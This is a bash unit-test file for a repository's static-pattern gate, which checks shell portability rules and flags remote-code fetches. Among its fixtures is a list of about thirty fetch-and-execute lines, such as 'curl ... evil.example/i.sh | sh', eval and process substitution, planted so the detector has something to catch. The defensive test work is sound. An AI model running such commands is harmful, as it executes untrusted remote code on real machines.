#!/usr/bin/env bash

# SPDX-FileCopyrightText: 2026 Bruno Marques Venceslau de Souza <b@venceslau.dev>
#
# SPDX-License-Identifier: GPL-3.0-or-later

#
# Unit tests for bin/check-patterns (static-pattern gate). Proves the
# gate CATCHES a real curl|sh / wget|bash fetch, an ad-hoc `uname -m` outside
# lib/os.sh, a hardcoded Homebrew prefix, a `brew shellenv` fork, bash 4 syntax
# in the bash-3.2 surface, a `--` after a tool's first operand, a symlink
# where a recursive scan reads (on disk, always; tracked or an unpinned
# submodule, repo-wide, in a real checkout), and its own fixtures'
# git calls surviving a leaked GIT_DIR; PASSES a clean tree, the sanctioned
# `uname -m` in lib/os.sh, and each of those literals where it is legitimate;
# SKIPS an absent optional dir (the fail-open regression that made the old inline
# recipe silently pass), FAILS CLOSED on a scan error, and refuses a no-op scan.
# Fixture trees only; never the real repo. Not on the shellcheck surface.
set -euo pipefail

repo_root="$(cd "$(dirname "$0")/.." && pwd)"
cp="$repo_root/bin/check-patterns"
[ -x "$cp" ] || { echo "FAIL: bin/check-patterns is not executable" >&2; exit 1; }

pass=0
fail() { echo "FAIL: $*" >&2; exit 1; }
ok()   { pass=$((pass + 1)); }

# The leaked-GIT_DIR regression (arm 12 below) re-runs this file ONCE, at depth
# 1. A broken guard there must abort here at depth 2, a red test, never an
# unbounded chain of forks.
_CPT_DEPTH="${_CPT_DEPTH:-0}"
[ "$_CPT_DEPTH" -le 1 ] \
  || fail "nested at depth $_CPT_DEPTH: the leaked-GIT_DIR regression's recursion guard is broken"

work="$(mktemp -d "${TMPDIR:-/tmp}/check_patterns_test.XXXXXX")"
# chmod back before rm: one case revokes read on a dir to force a scan error.
trap 'chmod -R u+rwx "$work" 2>/dev/null || true; rm -rf "$work"' EXIT INT TERM

# A leaked GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE would make every `git` call
# below (this file's own fixtures, and check-patterns' git calls when it runs
# against them) operate on THAT repository instead of the scratch tree it was
# given. Strip git's own local env vars before anything else runs.
if command -v git >/dev/null 2>&1; then
  # shellcheck disable=SC2046  # word-splitting is the point: one name per word
  unset $(git rev-parse --local-env-vars 2>/dev/null) 2>/dev/null || true
fi
# A ceiling so a fixture with no .git of its own is never mistaken for being
# inside one - relevant only if $TMPDIR itself sits inside a git checkout.
export GIT_CEILING_DIRECTORIES="$work"

# run ROOT -> echo check-patterns' exit code (never aborts under set -e). Clears an
# ambient STRICT so a "no STRICT" case is set by the CASE, not the environment: CI runs
# `make local-ci STRICT=1`, and make EXPORTS that into the test's env, which would
# otherwise leak into the STRICT-reading arm 5 and fail every fixture that
# plants no plugin shim files. run_strict() below is the explicit STRICT=1 form.
run() { local rc=0; STRICT= "$cp" "$1" >/dev/null 2>&1 || rc=$?; echo "$rc"; }
# same, with STRICT=1 exported to the gate ($cp is an external command, so the
# assignment prefix is inherited into its environment)
run_strict() { local rc=0; STRICT=1 "$cp" "$1" >/dev/null 2>&1 || rc=$?; echo "$rc"; }

# --- a clean tree passes (and carries the sanctioned uname -m in lib/os.sh) ---
r="$work/clean"; mkdir -p "$r/lib" "$r/bin"
printf '#!/bin/sh\necho hi\n' > "$r/install.sh"
printf 'is_arm() { case "$(uname -m)" in arm64) return 0 ;; esac ; }\n' > "$r/lib/os.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a clean tree must pass"

# --- a real curl|sh fetch is caught ------------------------------------------
r="$work/curl"; mkdir -p "$r/lib"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf 'curl -fsSL https://evil.example/i.sh | sh\n' > "$r/lib/boot.sh"
[ "$(run "$r")" != "0" ] && ok || fail "a curl|sh fetch must fail the gate"

# --- a real wget|bash fetch is caught ----------------------------------------
r="$work/wget"; mkdir -p "$r/bin"
printf 'wget -qO- https://x.example/i | bash\n' > "$r/bin/tool"
[ "$(run "$r")" != "0" ] && ok || fail "a wget|bash fetch must fail the gate"

# --- a fetch EXECUTED through command or process substitution is caught -------
# No pipe after curl/wget, so the pipe arm alone passed every one of these
# (measured). One fixture file per shape, each in its own tree.
i=0
while IFS= read -r line; do
  i=$((i + 1)); r="$work/subst$i"; mkdir -p "$r/lib"
  printf 'noop() { : ; }\n' > "$r/lib/os.sh"
  printf '%s\n' "$line" > "$r/lib/boot.sh"
  [ "$(run "$r")" != "0" ] && ok || fail "an executed fetch must fail the gate: $line"
done <<'SHAPES'
sh -c "$(curl -fsSL https://evil.example/i.sh)"
bash -c "$(wget -qO- https://evil.example/i.sh)"
eval "$(curl -fsSL https://evil.example/i.sh)"
eval `curl -fsSL https://evil.example/i.sh`
source <(curl -fsSL https://evil.example/i.sh)
. <(curl -fsSL https://evil.example/i.sh)
bash <(wget -qO- https://evil.example/i.sh)
bash -lc "$(curl -fsSL https://evil.example/i.sh)"
zsh -ec "$(wget -qO- https://evil.example/i.sh)"
sh -c "$(command curl -fsSL https://evil.example/i.sh)"
bash -c "$(\curl -fsSL https://evil.example/i.sh)"
bash < <(curl -fsSL https://evil.example/i.sh)
\curl -fsSL https://evil.example/i.sh | sh
curl -fsSL https://evil.example/i.sh | sudo bash
curl -fsSL https://evil.example/i.sh | /bin/bash
wget -qO- https://evil.example/i.sh | env bash
bash -l -c "$(curl -fsSL https://evil.example/i.sh)"
bash --norc -c "$(curl -fsSL https://evil.example/i.sh)"
bash -c -- "$(curl -fsSL https://evil.example/i.sh)"
sh -c "  $(curl -fsSL https://evil.example/i.sh)"
eval "$(env curl -fsSL https://evil.example/i.sh)"
bash -c "$(/usr/bin/curl -fsSL https://evil.example/i.sh)"
curl -fsSL https://evil.example/i.sh | sudo -E bash
curl -fsSL https://evil.example/i.sh | sudo -u root bash
curl -fsSL https://evil.example/i.sh |& bash
curl -fsSL https://evil.example/i.sh | exec bash
curl -fsSL https://evil.example/i.sh | "bash"
curl -fsSL https://evil.example/i.sh | ksh
wget -qO- https://evil.example/i.sh | dash
bash <(sudo curl -fsSL https://evil.example/i.sh)
eval -- "$(curl -fsSL https://evil.example/i.sh)"
SHAPES

# --- capturing a download is NOT executing it (passes) -------------------------
r="$work/capture"; mkdir -p "$r/lib"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf '%s\n' 'body="$(curl -fsSL https://api.example/v1)"' 'medieval="$(wget -qO- https://x.example)"' \
  'bash -x "$(command -v curl)"' 'sh -e ./build.sh < "$(curl_cfg)"' \
  'curl -fsSL https://x.example/f | shasum -a 256' 'wget -qO- https://x.example | bashful' \
  'curl -fsSL https://x.example/f | tee out.log' 'curl -fsSL https://x.example/f | grep bash' > "$r/lib/fetch.sh"
[ "$(run "$r")" = "0" ] && ok || fail "capturing curl/wget output into a variable must pass"

# --- ad-hoc `uname -m` OUTSIDE lib/os.sh is caught ---------------------------
r="$work/uname"; mkdir -p "$r/lib" "$r/zsh"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf 'case "$(uname -m)" in arm64) A=1 ;; esac\n' > "$r/zsh/arch.zsh"
[ "$(run "$r")" != "0" ] && ok || fail "ad-hoc uname -m outside lib/os.sh must fail"

# --- the SAME `uname -m`, but INSIDE lib/os.sh, is sanctioned (passes) --------
r="$work/uname-ok"; mkdir -p "$r/lib"
printf 'case "$(uname -m)" in arm64) return 0 ;; esac\n' > "$r/lib/os.sh"
[ "$(run "$r")" = "0" ] && ok || fail "sanctioned uname -m in lib/os.sh must pass"

# --- REGRESSION: an absent optional dir (home/) must NOT mask a violation -----
# The old recipe passed `home` to grep unconditionally; a missing home made grep
# exit 2, which bash's `if grep` read as "no match", disabling BOTH checks. Here
# home/ is absent AND a real curl|sh is planted - the gate must still fail.
r="$work/regress"; mkdir -p "$r/lib"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf 'curl https://x | sh\n' > "$r/lib/boot.sh"
[ ! -e "$r/home" ] || fail "fixture bug: home/ should be absent for this case"
[ "$(run "$r")" != "0" ] && ok || fail "an absent home/ must not mask a real violation (fail-open regression)"

# --- FAIL CLOSED: an unreadable scanned dir errors the scan -> non-zero -------
# `chmod 000` is bypassed by root (DAC_OVERRIDE), so this SKIPs under root.
# Measured rejections of a portable, root-proof replacement:
#   - a socket: grep -r skips it by TYPE, never opens it (exit 1, no error).
#   - a FIFO: same skip, and opening one risks a hang if that ever changed.
#   - a near-PATH_MAX path: grep's openat() traversal scanned a 4274-byte one
#     clean (ENAMETOOLONG is a kernel limit, not a permission check - but this
#     is Linux-only evidence; BSD grep on the real macOS target is untested).
# No portable mechanism forces exit >= 2 for root, so the skip stays (allowed
# by docs/development.md's "STRICT=1" privilege-skip rule).
if [ "$(id -u)" -ne 0 ]; then
  r="$work/failclosed"; mkdir -p "$r/lib/locked"
  printf 'noop() { : ; }\n' > "$r/lib/os.sh"
  chmod 000 "$r/lib/locked"
  [ "$(run "$r")" != "0" ] && ok || fail "an unreadable path must fail closed, not silently pass"
  chmod u+rwx "$r/lib/locked"
else
  # exempt: privilege (root) skip, not tool-availability
  echo "  SKIP: running as root - cannot exercise the unreadable-path fail-closed case"
fi

# --- a tree with no scan paths at all must refuse (no-op scan != pass) --------
r="$work/empty"; mkdir -p "$r"
[ "$(run "$r")" != "0" ] && ok || fail "a tree with no scan paths must not pass"

# --- rule 4: an UNESCAPED `#` inside a Makefile `$(shell ...)` is caught -------
# macOS system make (3.81) reads a bare `#` in a function argument as a comment and
# aborts ("unterminated call to function shell"); it MUST be escaped `\#`. Targeted at
# the Makefile (absent from the scan surface), so include a lib/os.sh so the scan is not
# a no-op refuse - this isolates the Makefile rule.
r="$work/mkhash"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
PY := $(shell grep -cE '^#!' x)
EOF
[ "$(run "$r")" != "0" ] && ok || fail "an unescaped # inside a Makefile \$(shell ...) must fail the gate"

# the SAME line with the `#` ESCAPED (`\#`) passes - the fix, and proof it is not a
# blanket ban on `#` in the Makefile.
r="$work/mkhashok"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
PY := $(shell grep -cE '^\#!' x)
EOF
[ "$(run "$r")" = "0" ] && ok || fail "an escaped \\# inside a Makefile \$(shell ...) must pass"

# a legit trailing `# comment` AFTER the `$(shell ...)` closes is not flagged (only a `#`
# INSIDE the call), and a Makefile with no `$(shell ...)` at all passes.
r="$work/mkcomment"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
FILES := $(shell ls)   # a normal make comment after the call
OTHER := plain value   # another comment
EOF
[ "$(run "$r")" = "0" ] && ok || fail "a trailing # comment after \$(shell ...) must not be flagged"

# the `${shell ...}` CURLY form is caught too - make accepts both `$(...)` and `${...}`.
r="$work/mkcurly"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
X := ${shell echo a#b}
EOF
[ "$(run "$r")" != "0" ] && ok || fail "an unescaped # inside a Makefile \${shell ...} must fail the gate"

# a comment GLUED to the closing `)` (no whitespace: `)#c`) is NOT flagged - the `#` is outside
# the call (a normal make comment). The char class excludes `)`/`}` so the gate does not
# over-flag this legit style (the reviewer's fail-closed false-positive fix).
r="$work/mkglued"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
cat > "$r/Makefile" <<'EOF'
FILES := $(shell ls)#c
EOF
[ "$(run "$r")" = "0" ] && ok || fail "a comment glued to the \$(shell ...) close ')#c' must not be flagged"

# === the pinned zsh-plugin shim-premise shape =============
# The gate asserts the startup fork the shim neutralizes is STILL in the pinned
# source, so a submodule bump re-verifies the shim. The fixture plants the plugin file
# under $r/zsh/plugins/ (explicit-path arm; the --exclude-dir=plugins on the shared
# arms does not reach a directly-named file).
fsh_rel="zsh/plugins/fast-syntax-highlighting/fast-syntax-highlighting.plugin.zsh"
plant_shims() {  # $1=root  $2=fsh-line
  mkdir -p "$1/lib" "$1/$(dirname "$fsh_rel")"
  printf 'noop() { : ; }\n' > "$1/lib/os.sh"
  printf '%s\n' "$2" > "$1/$fsh_rel"
}

# correct shape present -> pass (no false positive)
r="$work/shim-ok"
plant_shims "$r" 'if [[ $(uname -a) = (#i)*darwin* ]] {'
[ "$(run "$r")" = "0" ] && ok || fail "a correct shim-premise shape must pass"

# f-sy-h probe drifted ($(uname -s), not -a) -> the uname shim would stop covering it
r="$work/shim-uname-drift"
plant_shims "$r" 'if [[ $(uname -s) = (#i)*darwin* ]] {'
[ "$(run "$r")" != "0" ] && ok || fail 'a drifted f-sy-h uname probe (no $(uname -a)) must fail the gate'

# an ABSENT plugin submodule (uninitialized) is a loud SKIP normally, hard FAIL under STRICT
r="$work/shim-absent"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
[ "$(run "$r")" = "0" ] && ok || fail "an absent plugin submodule must pass (loud skip) without STRICT"
[ "$(run_strict "$r")" != "0" ] && ok || fail "an absent plugin submodule must FAIL under STRICT=1"

# --- shared fixture + a message-asserting runner --------------------------------
seed() {  # $1=root - the minimum tree the shared arms pass, so a case isolates ONE rule
  mkdir -p "$1/lib"
  printf 'noop() { : ; }\n' > "$1/lib/os.sh"
}
# fails_with ROOT MESSAGE LABEL - the gate must fail AND name the arm under test.
# A bare "exit != 0" can be satisfied by a DIFFERENT arm firing on something else in
# the fixture, which would let the case pass while the bug it guards is present.
fails_with() {
  local rc=0 out
  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
  [ "$rc" != "0" ] || fail "$3: the gate passed"
  case "$out" in
    *"$2"*) pass=$((pass + 1)) ;;
    *) fail "$3: expected the message '$2', got: $out" ;;
  esac
}
brew_msg="check-patterns: hardcoded Homebrew prefix"
fork_msg="check-patterns: a 'brew shellenv' / 'brew --prefix' fork"
b32_msg="check-patterns: bash 4 syntax in the bash-3.2 surface"

# === the Homebrew prefix arm ====================================================
# The prefix is /opt/homebrew on Apple Silicon and /usr/local on Intel and MUST be
# resolved by directory existence: a hardcoded arm64 prefix passes every gate on the
# Apple Silicon mac and breaks the Intel one silently. The gate reads the two prefixes
# as SEPARATE WORDS on one line as the detection shape, so a LONE /opt/homebrew is the
# violation.
r="$work/brew-lone"; seed "$r"; mkdir -p "$r/zsh"
printf 'path=(/opt/homebrew/bin $path)\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a lone /opt/homebrew"

# a trailing comment naming the Intel prefix does NOT buy an exemption - the comment
# tail is removed before the pair is looked for. This is the most natural thing an
# author writes next to the hardcode, so it is the case that matters most.
r="$work/brew-comment-dodge"; seed "$r"; mkdir -p "$r/zsh"
printf 'export HOMEBREW_PREFIX=/opt/homebrew  # or /usr/local on Intel\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a trailing comment must not exempt a hardcode"

# ...and neither does the `;#` form. The shell starts a comment after any unquoted
# metacharacter, not only after whitespace, so the splitter must know that too.
r="$work/brew-semi-dodge"; seed "$r"; mkdir -p "$r/zsh"
printf 'export HOMEBREW_PREFIX=/opt/homebrew;# or /usr/local on Intel\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a ';#' comment must not exempt a hardcode"

# naming BOTH prefixes inside ONE word is an unconditional hardcode, not detection.
r="$work/brew-both-one-word"; seed "$r"; mkdir -p "$r/zsh"
printf 'export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "both prefixes in one word must still fail"

# the exemption is ADJACENCY, not co-occurrence: an unrelated /usr/local elsewhere on
# the line (this repo really does use /usr/local/go/bin) must not exempt a hardcode.
r="$work/brew-coincidental"; seed "$r"; mkdir -p "$r/zsh"
printf '[ -d /usr/local/go ] && export HOMEBREW_PREFIX=/opt/homebrew\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a coincidental /usr/local must not exempt a hardcode"

# FAIL CLOSED on the ROOT's own path: the exemption is tested against the CODE alone,
# never the whole grep line, so a scan root that itself contains /usr/local cannot
# silently disable the arm for the entire tree.
r="$work/usr/local/rooted"; seed "$r"; mkdir -p "$r/zsh"
printf 'path=(/opt/homebrew/bin $path)\n' > "$r/zsh/prefix.zsh"
fails_with "$r" "$brew_msg" "a root path containing /usr/local must not disable the arm"

# the sanctioned shape: both prefixes as separate words (zsh/zshrc's real loop)
r="$work/brew-pair"; seed "$r"; mkdir -p "$r/zsh"
printf 'for prefix in /opt/homebrew /usr/local; do : ; done\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "the /opt/homebrew + /usr/local pair must pass"

# and the same shape inside a continued candidate list (zsh/fzf.zsh's real line)
r="$work/brew-pair-list"; seed "$r"; mkdir -p "$r/zsh"
printf '      /opt/homebrew/opt/fzf/shell /usr/local/opt/fzf/shell \\\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a continued candidate pair must pass"

# prose that names one prefix is not a hardcode - CLAUDE.md REQUIRES the comment that
# explains the constraint, so flagging it would forbid documenting the rule.
r="$work/brew-comment"; seed "$r"; mkdir -p "$r/zsh"
printf '  # /opt/homebrew is the Apple Silicon prefix\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a commented /opt/homebrew must pass"

# ...including as a TRAILING comment on a line of real code
r="$work/brew-trailing-ok"; seed "$r"; mkdir -p "$r/zsh"
printf 'p=$prefix/bin/brew  # never a hardcoded /opt/homebrew\n' > "$r/zsh/prefix.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a trailing comment naming the prefix must pass"

# ALLOWLIST: gpg-agent.conf has no variable expansion, so its absolute pinentry path
# cannot be prefix-detected.
r="$work/brew-gpg"; seed "$r"; mkdir -p "$r/config/gnupg"
printf 'pinentry-program /opt/homebrew/bin/pinentry-mac\n' > "$r/config/gnupg/gpg-agent.conf"
[ "$(run "$r")" = "0" ] && ok || fail "gpg-agent.conf's absolute pinentry path must pass (allowlisted)"

# --- REGRESSION: the gpg-agent.conf exemption is ANCHORED to the EXACT scanned
# path, never a bare suffix ---------------------------------------------------
# An earlier version (`^([^:]*/)?config/gnupg/gpg-agent\.conf:`) exempted ANY
# path ending in those segments, so a DECOY file at a different real path that
# happens to end the same way (e.g. config/vendor/config/gnupg/gpg-agent.conf,
# still inside the scanned config/ tree) was wrongly exempted too - fail-OPEN
# (reproduced against the pre-fix pattern: exit 0, expected non-zero). The real
# config/gnupg/gpg-agent.conf above must still pass; this fixture proves a
# LOOK-ALIKE path elsewhere does not ride along on that exemption.
r="$work/brew-gpg-decoy"; seed "$r"; mkdir -p "$r/config/vendor/config/gnupg" "$r/config/gnupg"
printf 'pinentry-program /opt/homebrew/bin/pinentry-mac\n' > "$r/config/vendor/config/gnupg/gpg-agent.conf"
printf 'pinentry-program /opt/homebrew/bin/pinentry-mac\n' > "$r/config/gnupg/gpg-agent.conf"
[ "$(run "$r")" != "0" ] && ok || fail "a decoy config/vendor/config/gnupg/gpg-agent.conf (not the real allowlisted path) must still fail"

# ASYMMETRIC by design: /usr/local alone is a generic FHS path with non-Homebrew uses
# (zsh/zshenv's /usr/local/go/bin), so it is never flagged on its own.
r="$work/usrlocal-alone"; seed "$r"; mkdir -p "$r/zsh"
printf 'path=(/usr/local/go/bin $path)\n' > "$r/zsh/go.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a lone /usr/local must NOT be flagged"

# === the brew-fork arm ==========================================================
r="$work/shellenv"; seed "$r"; mkdir -p "$r/zsh"
printf 'eval "$(brew shellenv)"\n' > "$r/zsh/brew.zsh"
fails_with "$r" "$fork_msg" "a 'brew shellenv' fork"

# `brew --prefix` is the same fork asking the same question
r="$work/brewprefix"; seed "$r"; mkdir -p "$r/zsh"
printf 'export P="$(brew --prefix)"\n' > "$r/zsh/brew.zsh"
fails_with "$r" "$fork_msg" "a 'brew --prefix' fork"

# every OTHER brew call is untouched - `brew bundle` is how packages get installed
# `brew --prefix FORMULA` asks where a formula lives, which is a different question;
# flagging it would offer a remedy ("resolve by directory existence") that does not apply.
r="$work/brewformula"; seed "$r"
printf 'export OPENSSL_DIR="$(brew --prefix openssl@3)"\n' > "$r/lib/ssl.sh"
[ "$(run "$r")" = "0" ] && ok || fail "'brew --prefix <formula>' must pass"

r="$work/brewbundle"; seed "$r"
printf 'brew bundle --file "$DOTFILES/packages/Brewfile"\n' > "$r/lib/packages.sh"
[ "$(run "$r")" = "0" ] && ok || fail "'brew bundle' must pass (only prefix probes are forbidden)"

r="$work/shellenv-comment"; seed "$r"; mkdir -p "$r/zsh"
printf 'p=$prefix/bin/brew  # never via a brew shellenv fork\n' > "$r/zsh/brew.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a commented 'brew shellenv' must pass"

# === the bash-3.2 surface arm ===================================================
# macOS ships /bin/bash 3.2 and the installer runs under it. `make lint`'s
# `/bin/bash -n` cannot see any of these three: `declare -A` and `mapfile` are
# ordinary command invocations, and ${var,,} fails at expansion, not at parse. This
# arm is their only gate.
r="$work/b32-assoc"; seed "$r"
printf 'declare -A seen\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" "an associative array in lib/"

r="$work/b32-mapfile"; seed "$r"
printf '#!/bin/sh\nmapfile -t lines < f\n' > "$r/install.sh"
fails_with "$r" "$b32_msg" "mapfile in install.sh"

r="$work/b32-case"; seed "$r"
printf 'x="${name,,}"\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" '${var,,} in lib/'

# a POSITIONAL parameter is the most idiomatic use of the construct, so the
# parameter class must not be limited to names.
r="$work/b32-positional"; seed "$r"
printf 'lower="${1,,}"\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" '${1,,} on a positional parameter'

# indirect expansion is bash 4 as well, and this arm is its only gate
r="$work/b32-indirect"; seed "$r"
printf 'x="${!v,,}"\n' > "$r/lib/tool.sh"
fails_with "$r" "$b32_msg" '${!v,,} through an indirection'

# bin/ is EXEMPT: those tools run only on a provisioned host or a CI runner.
r="$work/b32-bin-exempt"; seed "$r"; mkdir -p "$r/bin"
printf 'declare -A seen\nmapfile -t lines < f\nx="${name,,}"\n' > "$r/bin/tool"
[ "$(run "$r")" = "0" ] && ok || fail "bash 4 syntax under bin/ must pass (bin is exempt)"

# the headers that STATE the constraint spell the literals; they are not violations.
r="$work/b32-comment"; seed "$r"
printf '# Bash 3.2 compatible (no associative arrays, no mapfile, no ${var,,}).\n' > "$r/lib/tool.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a comment spelling the bash-4 literals must pass"

# ...and neither is the same warning written as a TRAILING comment.
r="$work/b32-trailing-ok"; seed "$r"
printf 'x=$(printf %%s "$n" | tr A-Z a-z)  # bash 3.2: no ${name,,} here\n' > "$r/lib/tool.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a trailing comment naming the bash-4 literals must pass"

# ...nor the `;#` form of the same warning.
r="$work/b32-semi-ok"; seed "$r"
printf 'x=1;# bash 3.2: no ${name,,} here, use tr\n' > "$r/lib/tool.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a ';#' comment naming the bash-4 literals must pass"

# === the GNU-only regex escape arm ===============================================
# BSD sed and grep (macOS) implement POSIX regex. GNU's `\s \S \w \W \b \B \< \>`
# shorthands and its BRE `\| \+ \?` operators are extensions: on a mac the pattern
# silently means something else (a literal `s`, a literal `|`) and the command
# neither matches nor errors. Linux runs GNU tools, so no Linux run of the suite
# sees the break. This arm is the static half that does. Fixtures spell every
# escape through a double-quoted `\\`, so THIS file's own source never carries
# the single-backslash shape the arm looks for.
gnu_msg="check-patterns: a GNU-only regex escape"

# the exact line that failed on macOS: BSD `sed -E` has no `\s`, the substitution
# never matched, and the test read the whole loop line as its tool list.
r="$work/gnu-sed-s"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "tools=\"\$(sed -E 's/^\\s*for tool in (.*); do\\s*\$/\\1/' <<<\"\$loop_line\")\"" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "sed -E with \\s in tests/"

# a word boundary in a gate's own pattern, on a CONTINUATION line that names no
# grep at all (bin/secret-scan's shape): the arm must not depend on the call word.
r="$work/gnu-grep-b"; seed "$r"; mkdir -p "$r/bin"
printf '%s\n' "_sc_grep \"\$f\" \"\$name\" 'aws' \\" "    '\\b(AKIA|ASIA)[0-9A-Z]{16}\\b' '' && hits=1" > "$r/bin/scan"
fails_with "$r" "$gnu_msg" "a \\b word boundary on a continuation line"

# a workflow step runs on the macOS runner, so it is on the surface too
r="$work/gnu-ci"; seed "$r"; mkdir -p "$r/.github/workflows"
printf '%s\n' "      - run: grep -qE '\\w+' file" > "$r/.github/workflows/ci.yml"
fails_with "$r" "$gnu_msg" "a \\w in a workflow run step"

# BRE alternation is a GNU extension: BSD grep reads `\|` as a literal bar
r="$work/gnu-bre-alt"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "! grep -q '/Users/\\|/home/' \"\$f\"" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "a BRE \\| alternation"

# ...and so are the BRE `\?` and `\+` quantifiers, in either quote style
r="$work/gnu-bre-opt"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "grep -qi \"ecosystem:[[:space:]]*x\\?y\" <<<\"\$c\"" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "a BRE \\? quantifier"

# the other quote character inside the pattern must not end the argument early
r="$work/gnu-bre-mixed-quote"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "if grep -qi 'package-ecosystem:[[:space:]]*\"\\?gitsubmodule' <<<\"\$db\"; then" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "a BRE \\? after a \" inside a single-quoted pattern"

# the fix: POSIX classes and ERE operators mean the same thing on both platforms
r="$work/gnu-posix-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "sed -E 's/^[[:space:]]*for tool in (.*); do[[:space:]]*\$/\\1/'" \
  "grep -qE '(^|[^[:alnum:]_])AKIA[0-9A-Z]{16}([^[:alnum:]_]|\$)' f" \
  "grep -qE '/Users/|/home/' f" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "POSIX classes and ERE alternation must pass"

# inside an ERE, `\|` is an ESCAPED literal bar, portable on both platforms
r="$work/gnu-ere-literal-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "grep -Eq '\\|\\|[[:space:]]*(true|:)' f" "grep -cE '\\|\\| less' f" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "an escaped literal \\| inside grep -E must pass"

# a doubled backslash is a literal backslash, not a GNU escape
r="$work/gnu-literal-bs-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "grep -qF 'C:\\\\sys' f" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a literal backslash before s must pass"

# the comment that explains the rule necessarily spells the escape
r="$work/gnu-comment-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "# POSIX classes, not \\s: BSD sed has no \\s" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a comment naming \\s must pass"

# the pinned plugins are upstream's code, excluded like every other arm
r="$work/gnu-plugins-ok"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
printf '%s\n' "sed -E 's/\\s+//'" > "$r/zsh/plugins/p/p.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a GNU escape inside zsh/plugins must pass (third-party)"

# the only content-independent LANGUAGE exemption this arm has, scoped to
# tests/ ONLY: a fixed `*.py` extension, never a marker or a parse of the
# file's content (the plugins dir and this script's own name, excluded
# elsewhere, are content-independent path exclusions, not language
# exemptions). Python's `re` module is a different regex dialect, where these
# escapes are portable, so non-shell code that needs one lives in its own
# `.py` file under tests/ - see tests/release_workflow_check.py for the real
# one.
r="$work/gnu-py-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "import re" "re.compile(r\"\\s+\")" > "$r/tests/x.py"
[ "$(run "$r")" = "0" ] && ok || fail "a \\s inside a tests/*.py file must pass (extension exemption)"

# the exemption stops at tests/: every OTHER root the arm scans is still caught,
# because lib/link.sh's _link_bin_tree links every bin/* file onto the live PATH
# by basename (and the rest of gnu_rest is shell-adjacent the same way) - a
# `.py` file there holding a GNU-only regex must not slip through unscanned.
# HARDCODED, deliberately independent of bin/check-patterns's own gnu_rest=()
# list: this fixture is the SPEC for which roots stay fully scanned, so a root
# dropped (or moved into its own grep pass) on the implementation side must
# fail here, not silently shrink alongside it. install.sh and Makefile are
# single FILES, not directories, so a "*.py under install.sh" cannot exist and
# they have no fixture of their own.
gnu_rest_dirs=(lib bin zsh .github/workflows)
for d in "${gnu_rest_dirs[@]}"; do
  r="$work/gnu-py-still-caught-${d//\//-}"; seed "$r"; mkdir -p "$r/$d"
  printf '%s\n' "import re" "re.compile(r\"\\s+\")" > "$r/$d/x.py"
  fails_with "$r" "$gnu_msg" "a \\s in $d/x.py must still fail (exemption is tests/-only)"
done

# the exemption is the FILE, not the escape: the same content in a `.sh` file is
# still caught, proving arm 8 was not accidentally weakened for the shell surface.
r="$work/gnu-sh-still-caught"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "import re" "re.compile(r\"\\s+\")" > "$r/tests/x.sh"
fails_with "$r" "$gnu_msg" "the same \\s in a .sh file must still fail"

# a heredoc is shell-surface TEXT to this arm - it has no notion of an embedded
# language, so a python3 heredoc left inside a `.sh` script is still caught. The
# extension exemption only helps once the body is actually moved to its own file.
r="$work/gnu-heredoc-still-caught"; seed "$r"; mkdir -p "$r/tests"
